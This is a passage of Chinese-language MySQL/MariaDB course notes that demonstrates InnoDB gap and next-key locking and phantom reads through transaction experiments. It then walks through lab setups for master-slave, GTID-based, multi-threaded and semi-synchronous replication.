lock_table: `db1`.`t1` lock_index: `PRIMARY` lock_space: 0 lock_page: 337 lock_rec: 3 lock_data: 3*************************** 2. row *************************** lock_id: 1121:0:337:3lock_trx_id: 1121 lock_mode: X lock_type: RECORD lock_table: `db1`.`t1` lock_index: `PRIMARY` lock_space: 0 lock_page: 337 lock_rec: 3 lock_data: 32 rows in set (0.02 sec)ERROR: No query specifiedMariaDB [db1]&gt; select * from information_schema.innodb_lock_waits\\G;*************************** 1. row ***************************requesting_trx_id: 1122requested_lock_id: 1122:0:337:3 blocking_trx_id: 1121 blocking_lock_id: 1121:0:337:31 row in set (0.00 sec)ERROR: No query specified 从以上信息可以看到，T1事务当前只在b=3所在的行上加了写锁，排他锁，并没有同时使用gap锁来组成next-key lock。 到此，已经证明了，当查询的索引含有唯一属性时，将next-key lock降级为record key 我们第二次创建的t1表的列b是主键，而主键必须是唯一的。 实践2： 关闭GAP锁_RC有两种方式显式关闭gap锁：（除了外键约束和唯一性检查外，其余情况仅使用record lock） A. 将事务隔离级别设置为RCB. 将参数innodb_locks_unsafe_for_binlog设置为1 T1 RR T2 RR begin; begin; select * from db1.t1 where b=3 for update; insert into db1.t1 values (‘batman’,2) ERROR 1205 (HY000): Lock wait timeout exceeded; try restarting transaction set session transaction isolation level READ COMMITTED; commit; commit; 注意，将T1事务设置为RC后，需要将二进制日志的格式改为row格式，否则执行显式加锁时会报错 12MariaDB [db1]&gt; insert into t1 values (&apos;batman&apos;,2);ERROR 1665 (HY000): Cannot execute statement: impossible to write to binary log since BINLOG_FORMAT = STATEMENT and at least one table uses a storage engine limited to row-based logging. InnoDB is limited to row-logging when transaction isolation level is READ COMMITTED or READ UNCOMMITTED. T1 RC T2 RR begin; begin; set session transaction isolation level READ COMMITTED; select * from db1.t1 where b=3 for update; insert into db1.t1 values (‘batman’,2) insert into db1.t1 values (‘batman’,4) commit; commit; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#T1事务MariaDB [db1]&gt; set session transaction isolation level READ COMMITTED;Query OK, 0 rows affected (0.00 sec)MariaDB [db1]&gt; select @@tx_isolation;+----------------+| @@tx_isolation |+----------------+| READ-COMMITTED |+----------------+1 row in set (0.00 sec)MariaDB [db1]&gt; begin;Query OK, 0 rows affected (0.09 sec)MariaDB [db1]&gt; select * from t1 where b=3 for update;+----------+------+| a | b |+----------+------+| superman | 3 |+----------+------+1 row in set (0.00 sec)#T2事务MariaDB [db1]&gt; begin;Query OK, 0 rows affected (0.16 sec)MariaDB [db1]&gt; select @@tx_isolation;+----------------+| @@tx_isolation |+----------------+| READ-COMMITTED |+----------------+1 row in set (0.00 sec)MariaDB [db1]&gt; insert into db1.t1 values (&apos;batman&apos;,2);Query OK, 1 row affected (0.00 sec)MariaDB [db1]&gt; commit;Query OK, 0 rows affected (0.01 sec)MariaDB [db1]&gt; set session transaction isolation level REPEATABLE READ;Query OK, 0 rows affected (0.00 sec)MariaDB [db1]&gt; select @@tx_isolation;+-----------------+| @@tx_isolation |+-----------------+| REPEATABLE-READ |+-----------------+1 row in set (0.00 sec)MariaDB [db1]&gt; begin;Query OK, 0 rows affected (0.00 sec)MariaDB [db1]&gt; insert into db1.t1 values (&apos;batman&apos;,4);Query OK, 1 row affected (0.00 sec)MariaDB [db1]&gt; commit;Query OK, 0 rows affected (0.00 sec)#T1事务MariaDB [db1]&gt; commit;Query OK, 0 rows affected (0.00 sec) 我在做测试的时候，T1事务隔离界别为RC，T2事务的隔离界别分别用RC和RR做了测试，都是可以的 实践3： 关闭GAP锁_innodb_locks_unsafe_for_binlog查看当前innodb_locks_unsafe_for_binlog参数的值 1234567MariaDB [(none)]&gt; select @@innodb_locks_unsafe_for_binlog;+----------------------------------+| @@innodb_locks_unsafe_for_binlog |+----------------------------------+| 0 |+----------------------------------+1 row in set (0.00 sec) 修改参数，并重新启动服务 12345678910[root@localhost ~]# vim /etc/my.cnfinnodb_locks_unsafe_for_binlog=1[root@localhost ~]# systemctl restart mariadb[root@localhost ~]# mysql -e &quot;select @@innodb_locks_unsafe_for_binlog&quot;+----------------------------------+| @@innodb_locks_unsafe_for_binlog |+----------------------------------+| 1 |+----------------------------------+ 还是去创建db1.t1表，如果已有就先drop；有列a和b，分别为char(10)和int型，并且b为key，注意b列为索引列，但并不是主键，因此不是唯一的。 T1 RR T2 RR begin; begin; select * from db1.t1 where b=3 for update; insert into db1.t1 values (‘batman’,2) insert into db1.t1 values (‘batman’,4) commit; commit; 12345678910111213141516MariaDB [db1]&gt; create table db1.t1 (a char(10),b int,key (b));Query OK, 0 rows affected (0.03 sec)MariaDB [db1]&gt; insert into db1.t1 values (&apos;batman&apos;,1),(&apos;superman&apos;,3),(&apos;leo&apos;,5);Query OK, 3 rows affected (0.15 sec)Records: 3 Duplicates: 0 Warnings: 0MariaDB [db1]&gt; select * from db1.t1;+----------+------+| a | b |+----------+------+| batman | 1 || superman | 3 || leo | 5 |+----------+------+3 rows in set (0.02 sec) 接下来开启两个事务T1和T2，T1中查看b=3的行，显式加排他锁；T1未提交事务时，T2事务开启并尝试插入新行a=’batman’,b=2和a=’batman’,b=4； T1事务 12345678910MariaDB [(none)]&gt; begin;Query OK, 0 rows affected (0.00 sec)MariaDB [(none)]&gt; select * from db1.t1 where b=3 for update;+----------+------+| a | b |+----------+------+| superman | 3 |+----------+------+1 row in set (0.01 sec) T2事务 1234567891011MariaDB [(none)]&gt; begin;Query OK, 0 rows affected (0.00 sec)MariaDB [(none)]&gt; insert into db1.t1 values (&apos;batman&apos;,4);Query OK, 1 row affected (0.01 sec)MariaDB [(none)]&gt; insert into db1.t1 values (&apos;batman&apos;,2);Query OK, 1 row affected (0.00 sec)MariaDB [(none)]&gt; commit;Query OK, 0 rows affected (0.00 sec) T1事务 12MariaDB [(none)]&gt; commit;Query OK, 0 rows affected (0.00 sec) 实践4：next-key locking是如何解决幻读问题的 首先什么是幻读呢？ 举个例子，两个男孩同时在追求一个女生的故事 A问：你有男朋友吗？女孩对他说没有。A追求女孩的事件还没有提交，就是继续追求哈。 就在A追求的同时，B也在追求，并且直接让女孩做他的女朋友，女孩答应了，B的追求事件结束。 A又问：你有男朋友吗？ 女孩对他说我已经有男朋友了！ 呜呜呜 ！刚才你还没有的，怎么现在就有了呢？ 女孩说，你也没说过你追我的时候不让别人追我啊！… … A哭着走了。 幻读 Phantom Problem 是指在同一事务下，连续执行两次相同的sql语句可能导致不同的结果，第二次的sql语句可能会返回之前不存在的行。 在刚才我举的例子里，A虽然问了女孩有没有男朋友，但是没有告诉女孩，在他追求时，不可以接受别人的追求，所以悲催的结局。 那么A怎么才能在他追求事件结束前让女孩不答应别人的追求呢？ innodb中的RR隔离级别是通过next-key locking是如何解决幻读问题的，就是锁住一个范围。 那么如果你是A你怎么做呢？你肯定要跟女孩说，只要我开始追求你，问了你有没有男朋友，在我结束追求你之前，你不可以答应别人的追求！我要把你脑子里记录男朋友的区域全部锁起来，啊哈啊！ 下面我们来做一个测试，分别在RR和RC隔离级别中来实现： 测试使用表db1.t1 (a int primary key) ,记录有1,3,5 T1 RC T2 RR begin; begin; set session transaction isolation level READ COMMITTED; select * from db1.t1 where a&gt;3 for update; 查询结果为5 insert into db1.t1 values (4); commit; select * from db1.t1 where a&gt;3; 查询结果为4 5 1234567891011121314151617181920212223242526272829303132333435363738394041MariaDB [db1]&gt; create table t1 (a int primary key);Query OK, 0 rows affected (0.22 sec)MariaDB [db1]&gt; insert into t1 values (1),(3),(5);Query OK, 3 rows affected (0.02 sec)Records: 3 Duplicates: 0 Warnings: 0#事务T1MariaDB [db1]&gt; begin;Query OK, 0 rows affected (0.00 sec)MariaDB [db1]&gt; set session transaction isolation level read coQuery OK, 0 rows affected (0.01 sec)MariaDB [db1]&gt; select * from db1.t1 where a&gt;3 for update;+---+| a |+---+| 5 |+---+1 row in set (0.01 sec)#事务T2MariaDB [db1]&gt; begin;Query OK, 0 rows affected (0.00 sec)MariaDB [db1]&gt; insert into db1.t1 values (4);Query OK, 1 row affected (0.00 sec)MariaDB [db1]&gt; commit;Query OK, 0 rows affected (0.03 sec)#事务T1MariaDB [db1]&gt; select * from db1.t1 where a&gt;3 for update;+---+| a |+---+| 4 || 5 |+---+2 rows in set (0.00 sec) 将会话中的隔离界别改为RR，并删除a=4记录。 12345MariaDB [db1]&gt; set session transaction isolation level repeatable read;Query OK, 0 rows affected (0.00 sec)MariaDB [db1]&gt; delete from db1.t1 where a=4;Query OK, 1 row affected (0.00 sec) T1 RR T2 RR begin; begin; select * from db1.t1 where a&gt;3 for update; 查询结果为5 insert into db1.t1 values (4); ERROR 1205 (HY000): Lock wait timeout exceeded; try restarting transaction commit; select * from db1.t1 where a&gt;3; 查询结果为5 1234567891011121314151617181920212223242526272829#事务T1MariaDB [(none)]&gt; begin;Query OK, 0 rows affected (0.00 sec)MariaDB [(none)]&gt; select * from db1.t1 where a&gt;3 for update;+---+| a |+---+| 5 |+---+1 row in set (0.02 sec)#事务T2MariaDB [(none)]&gt; begin;Query OK, 0 rows affected (0.00 sec)MariaDB [(none)]&gt; insert into db1.t1 values (4);ERROR 1205 (HY000): Lock wait timeout exceeded; try restarting transactionMariaDB [(none)]&gt; commit;Query OK, 0 rows affected (0.00 sec)#事务T1MariaDB [(none)]&gt; select * from db1.t1 where a&gt;3 for update;+---+| a |+---+| 5 |+---+1 row in set (0.02 sec)","link":"/2016/12/30/booboo_mysql/03-MySQL-logical-architecture-and-InnoDB-storage-engine/"},{"title":"MySQL 管理课程 第七课 复制 AB replication","text":"本讲义参考 《 HA mysql 》 高可用MySQL:第2版 /(美)贝尔(Bell,C.),(美)肯德尔(Kindahl,M.),(美)塞尔曼 复制概述数据库为应用程序提供高可用性和可扩展性的重要特性之一就是复制(Replication)。复制在数据库层创建冗余,同时产生多个数据库副本进行读扩展。 复制就是把某个服务器上(称为 主节点服务器 或者简称 主节点 ,即 master)的所有变化克隆到另一个服务器(称为 从节点服务器 或简称 从节点 ,即 slave)。复制通常用来创建master 的一个可靠副本,不过复制也有其他用途。 两种最常见的使用复制的例子是 : (1)创建一个 master 的备份,以避免 master 崩溃时丢失数据 ; (2)创建一个 master 的副本,从而在不干扰其他业务的情况下执行报表和分析工作。 对小型企业来说,这足以简化很多事情,但复制可以做得更多,比如 : 支持多个机房 每个地点都可能要维护服务器,然后将变更复制到其他地方,从而使得信息处处可用。这就需要保护数据,在合法的情况下,保证用于审计目的的业务信息可用。 即使有服务器停机,也能保证业务的持续运行 如果原来的服务器失效,由其他服务器处理所有的访问量。 即使有灾难发生,也能保证业务持续运行 复制可以将变更发送给不同地理位置的其他数据中心。 错误保护(oops) 当 slave 连接 master 时,可从总是比 master 落后一个固定的时间周期(例如 1 小时),这样就会产生一个 延迟的 slave(Delayed Slave)。如果这时 master 上发生错误,可以找到出错的语句,然后在 slave 执行之前删除它。 目前很多应用程序中使用复制最重要的场景之一就是 横向扩展 (scale out)。现今的应用程序通常是读密集型的,具有高读写比。为了减少 master 上的负载,你可以搭建一个专门响应读请求的 slave。通过一个负载均衡器,可以将读请求定向到合适的 slave,而写请求则交给 master 处理。 在横向扩展的场景下使用复制时,理解 MySQL 复制的 异步性 (asynchronous)很重要,即事务首先在 master 上提交,然后复制到 slave 并在 slave 上执行。这意味着 master 和slave 可能并不一致,而且如果复制持续运行,slave 将会落后于 master。 使用异步复制的好处在于它比同步复制更快、更具可扩展性,但在那些实时数据很重要的情况下,必须处理好不同步的问题以保证信息的时效性。 然而,读扩展并不足以适用于所有应用程序。随着需求增加,数据库更大,写负载更高,需要扩展的就不只是读操作了。管理大型数据库,提升大型数据库系统的性能,可以通过分片 (sharding)技术来实现。通过分片,可以将数据库划分为若干可管理的数据分片,将数据库分发到多个服务器上,从而增加数据库的规模,并有效地扩展写操作。 复制的另一个重要应用是通过添加冗余来保证高可用性。最常见的技术是使用 双主配置(dual-master),即通过复制保持一对 master 总是可用,其中每个 master 都是对方的镜像。如果其中一个 master 失效,另一个会立即接手。 除了双主配置,还有其他与复制无关的高可用性技术,如使用共享存储或复制磁盘。尽管它们不是 MySQL 特有的,但这些技术对于保证高可用性来说也是很重要的工具 复制解决的问题 复制用例: 通过热备份达到高可用性 如果服务器宕机,一切都将停止 :不能执行(可能很关键的)事务, 无法得到用户信息,也不能检索其他重要数据。要不惜(几乎)一切代价避免这种情况发生,因为它会严重破坏业务。最简单的方法就是配置一个额外的服务器专门作为热备份(hot standby),在主服务器宕机的时候随时接管业务。 如果数据库只做了备份，现在数据库坏了，我们要恢复数据库，可能要花几个小时；但是现在我们希望这台数据库坏了，另外一台能够立刻顶上使用，该怎么做呢？ 那就需要我们有一个冗余的环境，备份是备份,冗余是冗余。概念不一样,备份是将数据以隔离的方式保存,备份的缺点,他不是瞬间还原,备份在还原过程中是有耗时的,他不是瞬间还原,例如,我们有几百个 G 的文件要还原回去,慢慢拷吧,几个小时。冗余不一样,主服务器/从服务器,主服务器坏掉,从服务器就顶上工作,所以冗余在可用性上来讲,恢复的速度上来讲,比备份来的快,但是冗余有他的缺点,备份有他的优点,比如我们作主从同步,主服务器和从服务器数据都一样的,如果主服务器上有人错删了一个表,我们把这种操作称为误操作,那么从服务器也会发生误操作,所以呢,冗余不能解决人为的误操作,而备份可以解决。冗余他能解决硬件故障,但是误操作无法解决,备份不是瞬间还原,但是既可以解决硬件故障又能解决误操作,他们各有优劣点,而真实的线上生产环境是两种方法一起使用,既有冗余环境,又有周期性备份,管理员要周期性地进行备份,同时有多台服务器作冗余。 产生报表 直接用服务器上的数据创建报表将大大降低服务器的性能,在某些情况下尤其显著。如果产生报表需要大量的后台作业,最好创建一个额外的服务器来运行这些作业。停止报表数据库上的复制,然后在不影响主要业务服务器的情况下运行大量查询,从而得到数据库在某一特定时间的快照。例如,如果在每天最后一个事务处理完毕后停止复制,可以提取日报表而其他业务仍正常运转。 调试和审计 还可以审查服务器上的查询。例如,查看某些查询是否有性能问题,以及服务器是否由于某个糟糕的查询而不同步。 复制的原理在详细介绍如何设置复制之前，让我门先看看MySQL实际上时如何复制数据的。总的来说，复制有三个步骤： 在主库上把数据更改记录到二进制日志（Binary Log）中（这写记录被称为二进制日志事件）。 备库将主库的日志复制到自己的中继日志（Relay Log）中。 备库读取中继日志中的事件，将其重放/重演到备库数据之上。 以上只是概述，实际商每一步都很复杂，下图更详细地描述了复制的细节。 项目实战1：mariadb server 5.5 单主从架构 单主从步骤 12345678910111213141516# 主服务器1）修改配置文件 log-bin server-id=1（重启服务）2）授权从机 grant replication slave to slave@172.25.0.12 uplooking3）初始化数据一致 mysqldump---》传输给从机器# 从服务1）install2）修改配置文件 server-id=23）初始化数据一致 导入全备数据4）&gt; change master master_host=&apos;172.25.0.11&apos; master_user=&apos;slave&apos; master_password=&apos;uplooking&apos; master_log_file=&apos;&apos; master_log_pos=&apos;&apos;5)&gt; start slave;6)&gt; show slave status\\G; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153## 主服务器[root@mastera0 mysql]# vim /etc/my.cnf[root@mastera0 mysql]# grep -v &apos;^#&apos; /etc/my.cnf|grep -v &apos;^$&apos;[mysqld]datadir=/var/lib/mysqlsocket=/var/lib/mysql/mysql.socksymbolic-links=0log-bin=/var/lib/mysql-log/masteraserver-id=1[mysqld_safe]log-error=/var/log/mariadb/mariadb.logpid-file=/var/run/mariadb/mariadb.pid!includedir /etc/my.cnf.d[root@mastera0 mysql]# systemctl restart mariadb[root@mastera0 mysql]# mysql -uroot -puplookingWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 2Server version: 5.5.44-MariaDB-log MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; grant replication slave on *.* to slave@&apos;172.25.0.12&apos; identified by &apos;uplooking&apos;;Query OK, 0 rows affected (0.00 sec)MariaDB [(none)]&gt; flush privileges;Query OK, 0 rows affected (0.00 sec)MariaDB [(none)]&gt; \\qBye[root@mastera0 mysql]# mysqldump -uroot -puplooking -A --single-transaction --master-data=2 --flush-logs &gt; /tmp/mysql.91.sql[root@mastera0 mysql]# scp /tmp/mysql.91.sql root@172.25.0.12:/tmpThe authenticity of host \\&apos;172.25.0.12 (172.25.0.12)\\&apos; can\\&apos;t be established.ECDSA key fingerprint is 91:2b:bd:df:0e:17:da:a0:f6:01:ff:5b:09:50:e8:ad.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added &apos;172.25.0.12&apos; (ECDSA) to the list of known hosts.root@172.25.0.12\\&apos;s password:mysql.91.sql 100% 505KB 504.7KB/s 00:00 ## 从服务器[root@masterb0 ~]# yum install -y mariadb-server[root@masterb0 ~]# vi /etc/my.cnf[root@masterb0 ~]# systemctl start mariadb[root@masterb0 ~]# mysql &lt; /tmp/mysql.91.sql[root@masterb0 ~]# mysqlWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 3Server version: 5.5.44-MariaDB MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; flush privileges;Query OK, 0 rows affected (0.00 sec)MariaDB [(none)]&gt; \\qBye[root@masterb0 ~]# mysqlERROR 1045 (28000): Access denied for user &apos;root&apos;@&apos;localhost&apos; (using password: NO)[root@masterb0 ~]# mysql -uroot -puplookingWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 5Server version: 5.5.44-MariaDB MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt;MariaDB [(none)]&gt; change master to master_host=&apos;172.25.0.11&apos;,master_user=&apos;slave&apos;,master_password=&apos;uplooking&apos;,master_log_file=&apos;mastera.000028&apos;,MASTER_LOG_POS=245;Query OK, 0 rows affected (0.21 sec)MariaDB [(none)]&gt; start slave;Query OK, 0 rows affected (0.00 sec)MariaDB [(none)]&gt; show slave status\\G;*************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 172.25.0.11 Master_User: slave Master_Port: 3306 Connect_Retry: 60 Master_Log_File: mastera.000028 Read_Master_Log_Pos: 245 Relay_Log_File: mariadb-relay-bin.000002 Relay_Log_Pos: 527 Relay_Master_Log_File: mastera.000028 Slave_IO_Running: Yes Slave_SQL_Running: Yes Replicate_Do_DB: Replicate_Ignore_DB: Replicate_Do_Table: Replicate_Ignore_Table: Replicate_Wild_Do_Table: Replicate_Wild_Ignore_Table: Last_Errno: 0 Last_Error: Skip_Counter: 0 Exec_Master_Log_Pos: 245 Relay_Log_Space: 823 Until_Condition: None Until_Log_File: Until_Log_Pos: 0 Master_SSL_Allowed: No Master_SSL_CA_File: Master_SSL_CA_Path: Master_SSL_Cert: Master_SSL_Cipher: Master_SSL_Key: Seconds_Behind_Master: 0Master_SSL_Verify_Server_Cert: No Last_IO_Errno: 0 Last_IO_Error: Last_SQL_Errno: 0 Last_SQL_Error: Replicate_Ignore_Server_Ids: Master_Server_Id: 11 row in set (0.00 sec)ERROR: No query specifiedMariaDB [(none)]&gt;MariaDB [(none)]&gt; select * from db1.t1;+-----+| id |+-----+| 3 || 4 || 5 || 6 || 7 || 8 || 9 || 10 || 11 || 12 || 13 || 14 || 100 || 101 || 102 || 103 || 777 |+-----+17 rows in set (0.00 sec)MariaDB [(none)]&gt; \\qBye 项目实战2：mysql server 5.7 基于GTID的单主从架构 server ip software rule masterb 172.25.0.12 mysql-server 5.7 master slaveb 172.25.0.14 mysql-server 5.7 slave 配置文件如下： 123456789101112Master:[mysqld]server-id=1log-bin=/var/lib/mysql-log/masteragitd_mode=onenforce_gtid_consistency=1Slave:[mysqld]server-id=2gtid_mode=onenforce_gtid_consistency=1 其他步骤与项目实践类似，再次不再赘述 复制中的延迟问题_重演延迟 mysql5.5之前没有解决方案——单线程 mysql5.6（mariadb10）开始——一库一线程 mysql5.7（mariadb10.1）真正解决了——一组一线程 项目实战3：mysql server 5.7 基于GTID的并行MTS单主从架构MySQL 5.7才可称为真正的并行复制，这其中最为主要的原因就是slave服务器的回放与主机是一致的即master服务器上是怎么并行执行的slave上就怎样进行并行回放。 MTS: Prepared transactions slave parallel applier 该并行复制的思想最早是由MariaDB的Kristain提出，并已在MariaDB 10中出现，相信很多选择MariaDB的小伙伴最为看重的功能之一就是并行复制。 MySQL 5.7并行复制的思想简单易懂，一言以蔽之：一个组提交的事务都是可以并行回放，因为这些事务都已进入到事务的prepare阶段，则说明事务之间没有任何冲突（否则就不可能提交）。 设置重演模式slave-parallel-type 为了兼容MySQL 5.6基于库的并行复制，5.7引入了新的变量slave-parallel-type，其可以配置的值有： DATABASE：默认值，基于库的并行复制方式 LOGICAL_CLOCK：基于组提交的并行复制方式 支持并行复制的GTID last_committed sequence_number 并行复制配置与调优master_info_repository 设置重演线程数slave_parallel_workers slave_parallel_workers设置为0，则MySQL 5.7退化为原单线程复制 slave_parallel_workers设置为1，则SQL线程功能转化为coordinator线程，但是只有1个worker线程进行回放，也是单线程复制。然而，这两种性能却又有一些的区别，因为多了一次coordinator线程的转发，因此slave_parallel_workers=1的性能反而比0还要差 Enhanced Multi-Threaded Slave配置总结 123456# slaveslave-parallel-type=LOGICAL_CLOCKslave-parallel-workers=16master_info_repository=TABLErelay_log_info_repository=TABLErelay_log_recovery=ON 软件安装 host ip software masterb 172.25.0.12 mysql-community-server-5.7 slaveb 172.25.0.14 mysql-community-server-5.7 配置文件 123456789101112131415161718192021222324## master [mysqld] # AB replication server-id=1 log-bin=/var/lib/mysql-log/masterb # GTID gtid_mode=on enforce_gtid_consistency=1## slave [mysqld] # AB replication server-id=2 # open gtid mode gtid_mode=on enforce_gtid_consistency=1 # MTS 一组一线程 slave-parallel-type=logical_clock slave-parallel-workers=16 总结MySQL 5.7推出的Enhanced Multi-Threaded Slave解决了困扰MySQL长达数十年的复制延迟问题 项目实战4：mysql server 5.7 基于GTID的并行MTS单主从架构crash safe参数调优Mastersync_binlog=1 #强制刷新binlog到磁盘innodb_flush_log_at_trx_commit=1 #强制刷新redolog到磁盘 Slaverelay_log_recovery=1 #如果slave的中继日志出问题，能够再次自动获取master的二进制日志 配置文件 12345678910111213141516171819202122232425262728293031## master [mysqld] # AB replication server-id=1 log-bin=/var/lib/mysql-log/masterb # GTID gtid_mode=on enforce_gtid_consistency=1 # crash safe sync_binlog=1 innodb_flush_log_at_trx_commit=1## slave [mysqld] # AB replication server-id=2 # open gtid mode gtid_mode=on enforce_gtid_consistency=1 # slave crash relay_log_recovery=1 # MTS 一组一线程 slave-parallel-type=logical_clock slave-parallel-workers=16 总结 crash safe 打开后能够更好的保证在数据库出现断电等特殊情况下，数据尽可能地少丢失！ 复制中的延迟问题_读写分离 主服务器写入，同步到从服务器，在从服务器中读取数据，一般一台主服务器，多台从服务器(5.7版本以后支持多master，之前都是一个master ) 从MySQL5.5开始，MySQL以插件的形式支持半同步复制。 异步复制（Asynchronous replication） MySQL默认的复制即是异步的，主库在执行完客户端提交的事务后会立即将结果返给给客户端，并不关心从库是否已经接收并处理，这样就会有一个问题，主如果crash掉了，此时主上已经提交的事务可能并没有传到从上，如果此时，强行将从提升为主，可能导致新主上的数据不完整。 全同步复制（Fully synchronous replication） 指当主库执行完一个事务，所有的从库都执行了该事务才返回给客户端。因为需要等待所有从库执行完该事务才能返回，所以全同步复制的性能必然会收到严重的影响。 半同步复制（Semisynchronous replication） 介于异步复制和全同步复制之间，主库在执行完客户端提交的事务后不是立刻返回给客户端，而是等待至少一个从库接收到并写到relay log中才返回给客户端。相对于异步复制，半同步复制提高了数据的安全性，同时它也造成了一定程度的延迟，这个延迟最少是一个TCP/IP往返的时间。所以，半同步复制最好在低延时的网络中使用。 半同步复制的潜在问题客户端事务在存储引擎层提交后，在得到从库确认的过程中，主库宕机了，此时，可能的情况有两种 1.事务还没发送到从库上 此时，客户端会收到事务提交失败的信息，客户端会重新提交该事务到新的主上，当宕机的主库重新启动后，以从库的身份重新加入到该主从结构中，会发现，该事务在从库中被提交了两次，一次是之前作为主的时候，一次是被新主同步过来的。 2.事务已经发送到从库上 此时，从库已经收到并应用了该事务，但是客户端仍然会收到事务提交失败的信息，重新提交该事务到新的主上。 无数据丢失的半同步复制针对上述潜在问题，MySQL 5.7引入了一种新的半同步方案：Loss-Less半同步复制。 当然，之前的半同步方案同样支持，MySQL 5.7.2引入了一个新的参数进行控制-rpl_semi_sync_master_wait_point rpl_semi_sync_master_wait_point有两种取值 AFTER_SYNC 这个即新的半同步方案，Waiting Slave dump在Storage Commit之前。 AFTER_COMMIT 老的半同步方案 项目实战5：mysql server 5.7 基于GTID的并行MTS单主从半同步架构要想使用半同步复制，必须满足以下几个条件： MySQL 5.5及以上版本 变量have_dynamic_loading为YES 异步复制已经存在 安装插件 12345mysql&gt; install plugin rpl_semi_sync_master soname &apos;semisync_master.so&apos;;Query OK, 0 rows affected (0.10 sec)mysql&gt; install plugin rpl_semi_sync_slave soname &apos;semisync_slave.so&apos;;Query OK, 0 rows affected (0.05 sec) 配置文件 123456789101112131415161718192021222324252627282930313233343536## master [mysqld] # AB replication server-id=1 log-bin=/var/lib/mysql-log/masterb # GTID gtid_mode=on enforce_gtid_consistency=1 # crash safe sync_binlog=1 innodb_flush_log_at_trx_commit=1 # 半同步模式 rpl_semi_sync_master_enabled=1 rpl_semi_sync_master_timeout=1000## slave [mysqld] # AB replication server-id=2 # open gtid mode gtid_mode=on enforce_gtid_consistency=1 # slave crash relay_log_recovery=1 # MTS 一组一线程 slave-parallel-type=logical_clock slave-parallel-workers=16 # 半同步模式 rpl_semi_sync_slave_enabled=1 测试半同步复制超时后自动切换回异步模式 1234567891011121314151617mysql&gt; create database db1;Query OK, 1 row affected (0.06 sec)mysql&gt; create table db1.t1 (id int);Query OK, 0 rows affected (0.26 sec)mysql&gt; insert into db1.t1 values (1);Query OK, 1 row affected (0.23 sec)# 将slave关闭后再执行以下操作mysql&gt; insert into db1.t1 values (2);Query OK, 1 row affected (1.19 sec)mysql&gt; insert into db1.t1 values (3);Query OK, 1 row affected (0.36 sec)mysql&gt; insert into db1.t1 values (4);Query OK, 1 row affected (0.08 sec) 如果从机想回到半异步模式，需要重启slave，否则默认还是异步复制。 监控主从是否运行在半同步复制模式下 show status like &apos;rpl_semi_sync_master_status&apos;; show status like &apos;rpl_semi_sync_slave_status&apos;; 环境变量 12345678910111213mysql&gt; show variables like &apos;%Rpl%&apos;;+-------------------------------------------+------------+| Variable_name | Value |+-------------------------------------------+------------+| rpl_semi_sync_master_enabled | ON || rpl_semi_sync_master_timeout | 10000 || rpl_semi_sync_master_trace_level | 32 || rpl_semi_sync_master_wait_for_slave_count | 1 || rpl_semi_sync_master_wait_no_slave | ON || rpl_semi_sync_master_wait_point | AFTER_SYNC || rpl_stop_slave_timeout | 31536000 |+-------------------------------------------+------------+7 rows in set (0.30 sec) rpl_semi_sync_master_wait_for_slave_count MySQL 5.7.3引入的，该变量设置主需要等待多少个slave应答，才能返回给客户端，默认为1。 rpl_semi_sync_master_wait_no_slave ON 默认值，当状态变量Rpl_semi_sync_master_clients中的值小于rpl_semi_sync_master_wait_for_slave_count时，Rpl_semi_sync_master_status依旧显示为ON。 OFF 当状态变量Rpl_semi_sync_master_clients中的值于rpl_semi_sync_master_wait_for_slave_count时，Rpl_semi_sync_master_status立即显示为OFF，即异步复制。 说得直白一点，如果我的架构是1主2从，2个从都采用了半同步复制，且设置的是rpl_semi_sync_master_wait_for_slave_count=2，如果其中一个挂掉了，对于rpl_semi_sync_master_wait_no_slave设置为ON的情况，此时显示的仍然是半同步复制，如果rpl_semi_sync_master_wait_no_slave设置为OFF，则会立刻变成异步复制。 状态变量 1234567891011121314151617181920mysql&gt; show status like &apos;%Rpl_semi%&apos;;+--------------------------------------------+-------+| Variable_name | Value |+--------------------------------------------+-------+| Rpl_semi_sync_master_clients | 1 || Rpl_semi_sync_master_net_avg_wait_time | 0 || Rpl_semi_sync_master_net_wait_time | 0 || Rpl_semi_sync_master_net_waits | 6 || Rpl_semi_sync_master_no_times | 1 || Rpl_semi_sync_master_no_tx | 1 || Rpl_semi_sync_master_status | ON || Rpl_semi_sync_master_timefunc_failures | 0 || Rpl_semi_sync_master_tx_avg_wait_time | 1120 || Rpl_semi_sync_master_tx_wait_time | 4483 || Rpl_semi_sync_master_tx_waits | 4 || Rpl_semi_sync_master_wait_pos_backtraverse | 0 || Rpl_semi_sync_master_wait_sessions | 0 || Rpl_semi_sync_master_yes_tx | 4 |+--------------------------------------------+-------+14 rows in set (0.00 sec) 上述状态变量中，比较重要的有以下几个 Rpl_semi_sync_master_clients 当前半同步复制从的个数，如果是一主多从的架构，并不包含异步复制从的个数。 Rpl_semi_sync_master_no_tx The number of commits that were not acknowledged successfully by a slave. 具体到上面的测试中，指的是insert into test.test values(2)这个事务。 Rpl_semi_sync_master_yes_tx The number of commits that were acknowledged successfully by a slave. 总结 在一主多从的架构中，如果要开启半同步复制，并不要求所有的从都是半同步复制。 MySQL 5.7极大的提升了半同步复制的性能。 5.6版本的半同步复制，dump thread 承担了两份不同且又十分频繁的任务：传送binlog 给slave ，还需要等待slave反馈信息，而且这两个任务是串行的，dump thread 必须等待 slave 返回之后才会传送下一个 events 事务。dump thread 